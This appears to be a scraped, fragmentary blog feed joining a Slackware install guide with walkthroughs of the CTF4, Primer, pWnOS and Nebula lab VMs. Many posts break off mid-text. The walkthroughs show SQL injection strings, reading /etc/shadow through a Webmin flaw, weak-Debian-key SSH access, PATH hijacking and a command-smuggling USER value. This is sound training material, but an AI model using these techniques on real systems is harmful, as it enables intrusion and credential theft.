<h3>Setup</h3>

<p>Type setup to begin the installation setup process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksetup.png" title="slackware setup" alt="install setup"></p>

<p>Choose ADDSWAP to format the swap partition that was created earlier. It will be automatically detected by the setup wizard</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapsetup.png" title="add swap" alt="swap setup"></p>

<p>You can choose to check for bad blocks if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/badblocks.png" title="check bad blocks" alt="bad blocks"></p>

<p>You will get a message when the swap space is configured</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapdone.png" title="swap conf" alt="swap conf"></p>

<p>Next you have to choose the root partition, which in my case is sda2</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda2root.png" title="root partition" alt="root sda2"></p>

<p>I selected the quick format option</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/formatroot.png" title="root format" alt="quick format"></p>

<p>For the filesystem I chose ext4</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/ext4.png" title="ext4" alt="ext4"></p>

<p>The last partition is the home one</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda3home.png" title="sda3 home" alt="home"></p>

<p>After formatting and choosing its filesystem, you have to specify where you want it mounted. Type /home</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/home.png" title="mount home" alt="home"></p>

<p>The setup of the partitions is now complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partitionsdone.png" title="partitions complete" alt="finished partitioning"></p>

<p>Next you have to choose the source media for the installation. In my case, it is the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sourcemedia.png" title="source media" alt="source dvd"></p>

<p>Let the wizard auto scan for the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/autoscan.png" title="autoscan" alt="dvd scan"></p>

<p>Select the general packages that you want, I kept all except for the KDE ones, since I will be using XFCE for my GUI</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/packages.png" title="package selection" alt="install packages"></p>

<p>I chose the full option for simplicity</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/full.png" title="full install" alt="full"></p>

<p>After the installation process, you can create a boot stick if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootdisk.png" title="boot stick" alt="boot disk"></p>

<p>The bootloader used by Slackware is LILO. I selected the simple install and the standard console</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilo.png" title="lilo" alt="lilo"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilosplash.png" title="lilo splash screen" alt="lilo console"></p>

<p>Skip the extra parameters unless you know what you&rsquo;re doing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/kernelparams.png" title="lilo extra parameters" alt="lilo parameters"></p>

<p>You will next be prompted where to install they bootloader. I chose the MBR, since this is a VM dedicated to Slackware. But if this was on a dual booting system with Windows, you would want to install it on root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilombr.png" title="lilo mbr" alt="lilo install"></p>

<p>Choose your mouse type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/mouse.png" title="mouse type" alt="mouse"></p>

<p>The General Purpose Mouse software provides support for mouse devices in Linux virtual consoles.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gpm.png" title="general purpose mouse" alt="gpm"></p>

<p>Next is the network configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/net.png" title="network" alt="net config"></p>

<p>Enter your hostname and domain</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hostname.png" title="hostname" alt="host"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/domain.png" title="domain name" alt="domain"></p>

<p>For simplicity, I chose the Network Manager configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netconf.png" title="network configuration" alt="network config"></p>

<p>Confirm your choices before continuing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netdone.png" title="network setup" alt="net setup"></p>

<p>I went with the default startup services. Will add more on a need-to-use basis</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/startup.png" title="startup services" alt="startup"></p>

<p>You can try custom screen fonts if you want</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/fonts.png" title="custom fonts" alt="screen fonts"></p>

<p>Next is the hardware clock and timezone</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hwclock.png" title="hardware clock" alt="clock"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/timezone.png" title="timezone" alt="timezone"></p>

<p>For the GUI, I went with XFCE</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gui.png" title="gui" alt="xfce"></p>

<p>You will be asked to choose a root password next</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/pass.png" title="root password" alt="password"></p>

<p>With this, the installation setup is complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/complete.png" title="setup complete" alt="setup finished"></p>

<p>Exit the wizard and reboot your brand new Slackware machine. Hit Enter when you see the splash screen, or it will boot automatically in a couple of minutes</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksplash.png" title="lilo splash screen" alt="lilo boot"></p>

<h3>Booting into your system</h3>

<p>Slackware doesn&rsquo;t run the GUI automatically. You can change this by modifying the default runlevel</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/textlogin.png" title="text login" alt="no gui"></p>

<p>I chose to manually start the GUI so I can read the random quotes that are given at login. You can load the GUI with the <strong>startx</strong> command</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/finished.png" title="slackware" alt="slackware install"></p>

<p>All done! From here you can proceed to use your new distro, or customize it to your liking</p>

<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/home.png" title="home" alt="home"></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /mail/
</span><span class='line'>Disallow: /restricted/
</span><span class='line'>Disallow: /conf/
</span><span class='line'>Disallow: /sql/
</span><span class='line'>Disallow: /admin/</span></code></pre></td></tr></table></div></figure>


<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/squirrel.png" title="squirrelmail" alt="squirrelmail"></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/admin.png" title="admin" alt="admin"></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<p>With dstevens&#8217; credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/calendar.png" title="calendar" alt="calendar"></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...

</span><span class='line'>achen ALL=(ALL)   NOPASSWD:ALL
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

    <link href="http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/"/>
    <updated>2016-03-11T06:56:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to try a VM named Primer that was recently added to VulnHub. I was hooked by the description of it being a story driven VM that was inspired by William Gibson&rsquo;s Spraw Trilogy, which was one of my first reads in hacking literature, after I became interested in the subject! And it also provided me with a new novel to read, since I didn&rsquo;t know about Snow Crash:</p>

<blockquote><p>Concept</p>

<p>This is a story based challenge written in a style heavily inspired by Neil Stephensons Snow Crash and William Gibsons Sprawl Trilogy. Each
chapter is unlocked by solving the puzzle. From hardcoded clear text javascript password checks, SQL-injections and cracking hashes to a
simulated terminal. You only need to start the VM, a webserver will come up and you can connect with your browser. In fact you never have to
leave the browser.</p>

<p>Goal</p>

<p>Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s
going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and
responsibility.</p></blockquote>

<!-- more -->


<p>After you determine the IP address of the VM, point your browser to it and you will be greeted by this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level1.png" title="primer level 1" alt="primer level 1"></p>

<p>Read the story, it&rsquo;s a nice way to get you immersed in the challenge, and it also contains hints for solving the level.</p>

<p>Looking in the source, I saw this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Some f0rms are easier than others.
</span><span class='line'>This one was just a means to get to the next level so there was no need for her to apply her full set of skills or fake credentials. Manufacturing a bo0le4n response would probably be enaugh to let her pass.</span></code></pre></td></tr></table></div></figure>


<p>Well then, following the hint, I used a classic SQLi string that would be evaluated as True: <code>yo &lsquo;or 1=1&mdash; </code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level2.png" title="primer level 2" alt="primer level 2"></p>

<p>The description points to the user agent, and when checking the source again, we can see a comment stating exactly what we need to fool the bot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This bot was looking for a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of
</span><span class='line'>pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.</span></code></pre></td></tr></table></div></figure>


<p>Ok..I took the first 7 digits of Pi (3.141592) and converted them to MD5, getting the string <em>d483d00d07fcc80319d170ccf07fb5be</em>. Then I changed my user agent to this string, and bam!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level3.png" title="primer level 3" alt="primer level 3"></p>

<p>This time there is no hint in the source, but reading the plot description made me think about cookies, and I discovered an activeSession cookie with a value of false. Now let&rsquo;s see what happens if I change it to true..</p>

<p>Reloaded the page..and!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level4.png" title="primer level 4" alt="primer level 4"></p>

<p>I almost missed the hint hidden inside the <code><head></code> tag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span></code></pre></td></tr></table></div></figure>


<p>This made me check if there is a robots.txt file, and there I found the next piece of the puzzle!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>So, the character in the story seems to be getting more and more familiar..:D Now, let&rsquo;s go to the place that smells like a trap, and see what awaits us there!</p>

<p>You can see the page keeps reloading and you can&rsquo;t right-click to view the source..but there are other ways! First, I entered something in the box to see what would happen:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/beware.png" title="beware" alt="beware"></p>

<p>Yikes! Who knows what horrible thing we have disturbed! Better complete the rest fast! I looked at the source of the page with the <code>view-source</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>There is a Javascript code that decides the redirection when entering something in the box. Let&rsquo;s look at it:</p>

<p>The only way not to get..noticed, is to enter something that would match <em>substr()</em> method. <a href="http://www.w3schools.com/jsref/jsref_substr.asp">This method</a> extracts parts of a string, beginning at the character at the specified position, and returns the specified number of characters. So the code is looking in our input for the string Ikdf076 starting at the third character. I entered 00Ikdf076 and penetrated deeper into the intranet!</p>

<p>Moving further, looks like another reloading page.</p>

<p>Reading the source, there is another script that we have to decipher:</p>

<p>I cracked those MD5 hashes, first is <em>hello</em> and second is <em>GOD</em>&hellip;so let&rsquo;s say hello in the input box! I tried &ldquo;helloGOD&rdquo; but that just got me to another scary red page. Entering just &ldquo;GOD&rdquo; worked though!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level8b.png" title="primer level 8" alt="primer level 8"></p>

<p>If you glanced at the URL formats beginning at the second challenge, you probably noticed they begin with a number for the level, that keeps going up as you progress (1,2,3 etc.), an underscore, and then what looks like an MD5 hash! I copied all of them to an online cracking site, and here is the pattern:</p>

<p>1st node = 2</p>

<p>2nd = 3</p>

<p>3rd = 5</p>

<p>4th = 7</p>

<p>5th = 11</p>

<p>6th = 13</p>

<p>7th = 17</p>

<p>Following this, I surmised that the next one would be 19, because from the order it appears that next increase should be by 2. The order being: <code>1st to 2nd: +1 &ndash;> 2nd to 3rd: +2 &ndash;> 3rd to 4th: +2 &ndash;> 4th to 5th: +4 &ndash;> 5th to 6th: +2 &ndash;> 6th to 7th: +4</code>. So I constructed the URL for the next level with the hashed value of 19, like this: <code>8_1f0e3dad99908345f7439f8ffabdffc4/</code>.</p>

<p>What&rsquo;s this? It looks like a terminal prompt. I entered <em>whoami</em> in it:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_end.png" title="primer end" alt="primer complete"></p>

<p>I thought they were directories but couldn&rsquo;t cd to them. Then I tried cracking the names that look like long hashes of something, but no success. I looked at wintermute next:</p>

<p>Well, clearly something went wrong. Restoring a corrupt AI doesn&rsquo;t sound like the best idea. I&rsquo;m getting more curious about this story! :D I checked the running processes next:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/ps.png" title="ps" alt="ps"></p>

<p>Trying anything with the <em>c0re</em> command gave me an access denied error, but the <em>connect</em> looks interesting! I tried it, but it asked for a password. Damn! At this point, I tried many passwords, trying to glue information from the logs and also tried the previously hinted passwords. It actually took me a long time to score the right one, I had overlooked an easy one! Most of my tries revolved around joshua and something else, but it took me a while to realize I can figure out Joshua&rsquo;s birth date because both his age and the year of the log are given. So 2028 &ndash; 44 = 1984! (no special significance for that, huh :D). So when I tried <code>joshua1984</code>, the screen changed..and we are on Erebus!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/erebus.png" title="erebus" alt="erebus"></p>

<p>Uh-oh, this time it won&rsquo;t be so easy to read them. But it doesn&rsquo;t look as daunting as the ones I couldn&rsquo;t crack..sure enough, it turns out a base64 decode will do the trick!

The signaling is also going crazy even on segments that are relatively stable. Signaling to disconnected parts! And reactions to responses that would have but definitely have not been sent... Am I going crazy or is Chaos experiencing phantom pain?</span></code></pre></td></tr></table></div></figure>


<p>Trying to read the 3rd and 4th logs kicked me out of the terminal or something..after reconnecting, I looked at the running processes:</p>

<p>Cool, let&rsquo;s follow in Falken&rsquo;s footsteps..uhm, connects. I tried, but the password I had wasn&rsquo;t good! After more password guessing, I figured something suspicious is preventing me from reading the last logs. Also, all those decoding commands on the server must have been given for a reason! It&rsquo;s funny, but if I had just used them from the beginning instead of going to external sites, I might have progressed faster. Anyway, only after I verified that I could read the first 2 logs with the <em>decode</em> command, instead of pasting the strings inside to an online decoder, I thought I should try using it for the remaining logs as well. I cycled through the options until the one that hit the jackpot!</p>

<p>So it&rsquo;s Falken messing around that is hindering us..but it seems someone else is after him as well? I tried the same thing with the last log:</p>

<p>I followed the hint that Falken left us and googled for &ldquo;trivial zero&rdquo;. This returned info about a Riemann zeta function and I stopped reading after that because..well, it look complicated, and I thought I already had a good candidate for the password :D I tried connecting again, this time gave <em>Riemann</em> as password..new host, new things to do!</p>

<p>All right, let&rsquo;s get cracking! In the meantime, I looked for where to next:</p>

<p>So it seems we will have to connect as chaos for the next one. I went to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">HashKiller</a> and cracked the hashes as follows: <em>Falken</em>&ndash;<em>Riemann</em> (we already know), <em>Chaos</em>&ndash;<em>2.718281828459045</em> (wouldn&rsquo;t have guessed this one! If you are curious, this is a mathematical constant known as Euler&rsquo;s Number). Couldn&rsquo;t crack McCarthy&rsquo;s. But we have enough to pay Wintermute a visit:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/wintermute_connected.png" title="Wintermute" alt="Wintermute"></p>

<p>Uhm, there are no more breadcrumbs to follow..and why is there a file called nieve in here? Uh-oh..</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/end.png" title="nieve" alt="the end"></p>

<p>An invitation from the AIs! Much better than a squad of hired assassins that would erase all the tracks of this unfortunate hacker..well then, let&rsquo;s see what awaits on the other side!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/credits.png" title="credits" alt="credits"></p>

<p>This was such a great VM, one of my favorites! It required less technical know-how and more detective thinking (or story immersion). I highly recommend it, great storyline and atmosphere! Many thanks to Arne Rick for this unconventional challenge!</p>

So I scrolled back in the list of VMs to start with the older ones and move towards the newer ones. Today&rsquo;s target is pWnOS v1.0, a vulnerable Linux machine that apparently contains multiple avenues for getting root</p>

<p>Next, I looked at the web server, and here&rsquo;s what I saw:</p>

<p>Clicking next brought me to a not-so-typical help page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/help.png" title="help" alt="help"></p>

<p>No matter what skill level you choose, you will be taken to a mocking page with the text &ldquo;HAHAHAHA! , for a n00b you REALLY SUCK!&rdquo; (the n00b part comes from what you choose, so it will vary). I played a bit with the URL parameters, and when I modified <code><a href="http://192.168.80.150/index1.php?help=true&amp;connect=true">http://192.168.80.150/index1.php?help=true&amp;connect=true</a></code> to <code>connect=false</code>, the server spit back some PHP errors:</p>

<p>Cool, it looks like obama, osama and yomama have been busy making accounts on this box!</p>

<p>I looked next at the Webmin server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/webmin.png" title="webmin" alt="webmin"></p>

<p>Tried logging in with the default credentials <em>root/root</em>, but it didn&rsquo;t work. Time to search for some exploits!</p>

<h3>Getting the /etc/shadow file</h3>

<p>There is a file disclosure vulnerability for the Webmin server, available in Metasploit:</p>

<blockquote><p>A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive
information. The vulnerability is caused due to an unspecified error within the handling of an URL. This can be exploited to read the contents
of any files on the server via a specially crafted URL, without requiring a valid login. The vulnerability has been reported in Webmin
(versions prior to 1.290) and Usermin (versions prior to 1.220).</p></blockquote>

<p>With it, I was able to pull the target&rsquo;s <em>/etc/shadow</em> file:</p>

<p>From here you can crack the hashes with our pal, John the Ripper, but I won&rsquo;t go into that, because a Nessus scan revealed a shorter route to hacking the target.</p>

<h3>Exploit</h3>

<p>The host is vulnerable to the Debian OpenSSH/OpenSSL Package Random Number Generator Weakness that allows bruteforcing with precalculated SSH keys. You can read more about it <a href="https://github.com/g0tmi1k/debian-ssh">here</a>, and also download the vulnerable keys. The vulnerability stems from the fact that the random data used by the algorithm is the PID of the process generating the key.</p>

<p>Using the earlier file disclosure module of Metasploit, it&rsquo;s possible to search the contents of the <code>.ssh/authorized_keys</code> file for each user. I didn&rsquo;t find anything for root, but obama has been in the house!</p>

<p>So we know obama&rsquo;s public key, and we also have the vulnerable pregenerated keys that we downloaded earlier. So it&rsquo;s possible to search for this public key among all those keys:</p>

<h3>Privilege escalation</h3>

<p>The kernel version of the system is outdated:</p>

<p>Googling it instantly brought some good news about <code>vmsplice_to_pipe()</code>, a local privilge escalation vulnerability that affects kernels prior to 2.6.24.2. And the <a href="https://www.exploit-db.com/exploits/5092/">source</a> is available on ExploitDB. You can see that the author didn&rsquo;t lack any imagination with the name of the source code file (read the first line, it&rsquo;s hilarious) xD</p>

<p>Ok, back to business. I downloaded the file on the compromised box (had to use the <code>&mdash;no-check-certificate</code> option because I would get an error otherwise):</p>

    <updated>2016-01-09T09:50:44-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>  SUID files</li>
<li>  Permissions</li>
<li>  Race conditions</li>
<li>  Shell meta-variables</li>
<li>  $PATH weaknesses</li>
<li>  Scripting language weaknesses</li>
<li>  Binary compilation failures</li>
</ul>


<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<p>I am doing these levels by SSH&#8217;ing into the box, rather than directly in the Nebula terminal.</p>

<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>

<!-- more -->


<h3>Level00</h3>

<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>

<p>To access this level, log in as level00 with the password of level00.</p>

<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>

<h3>Level01</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>

<p>First, let&rsquo;s see our current path:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ PATH=/tmp:$PATH
</span><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/tmp$ cat echo 
</span><span class='line'>/bin/getflag</span></code></pre></td></tr></table></div></figure>


<p>Now go back and run the <em>flag01</em> binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Running this program outputs the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'>about to call system("/bin/echo level02 is cool")
</span><span class='line'>level02 is cool</span></code></pre></td></tr></table></div></figure>


<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>

<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
libraries  to  avoid vulnerabilities that could occur if set-user-ID or
set-group-ID programs accidentally trusted the environment.</p></blockquote>

<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
</span><span class='line'>level02@nebula:/home/flag02$ echo $USER

</span><span class='line'>about to call system("/bin/echo pwned;/bin/getflag; is cool")
</span><span class='line'>pwned
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>sh: is: command not found</span></code></pre></td></tr></table></div></figure>


<p>So why did this work? Remember this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


